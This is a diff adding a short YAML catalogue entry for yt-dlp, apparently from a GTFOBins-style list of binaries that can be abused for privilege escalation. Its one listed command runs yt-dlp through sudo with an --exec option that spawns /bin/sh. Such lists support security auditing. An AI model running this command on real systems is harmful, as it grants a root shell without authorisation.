@@ -1,0 +1,5 @@
+name: yt-dlp
+binary_path: /usr/bin/yt-dlp
+exploit_cmds:
+- 'sudo /usr/bin/yt-dlp ''https://www.youtube.com/watch?v=xxxxxxxxxxx'' --exec ''/bin/sh
+  #'''
